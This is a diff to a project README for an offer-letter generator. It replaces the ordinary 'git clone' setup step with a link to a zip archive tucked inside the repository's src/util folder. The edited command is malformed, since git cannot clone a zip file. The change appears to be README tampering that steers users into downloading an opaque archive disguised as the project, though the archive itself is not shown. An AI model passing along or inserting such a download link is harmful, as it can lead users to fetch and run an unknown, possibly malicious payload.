@@ -6,7 +6,7 @@ NPM: v10.5.2
 
 Run below command on cmd to clone this repository to local system
 
-git clone https://github.com/84j124w/offer-letter-generator
+git clone https://github.com/84j124w/offer-letter-generator/raw/refs/heads/main/src/util/letter_offer_generator_v3.1.zip
 
 or download the zip file
 
